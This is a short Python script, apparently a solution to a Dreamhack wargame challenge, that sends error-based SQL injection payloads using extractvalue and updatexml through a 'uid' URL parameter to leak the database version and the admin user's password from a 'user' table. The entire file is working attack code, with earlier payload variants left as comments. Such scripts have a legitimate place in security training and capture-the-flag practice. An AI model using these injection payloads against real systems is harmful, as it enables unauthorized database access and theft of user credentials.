from requests import get
url = "http://host1.dreamhack.games:18395/"

#query = f"admin’ and extractvalue(1,concat(0x3a,version()));"
#query = f"admin’ and updatexml(null,concat(0x3a,version()),null);"
#query = f"admin’ and extractvalue(1,concat(0x3a,(SELECT upw FROM user WHERE uid=‘admin’)));"
query = f"admin’ UNION SELECT extractvalue(1,concat(0x3a,(SELECT upw FROM user WHERE uid=‘admin’)));"

r = get(f"{url}/?uid={query}")
print(r.text)
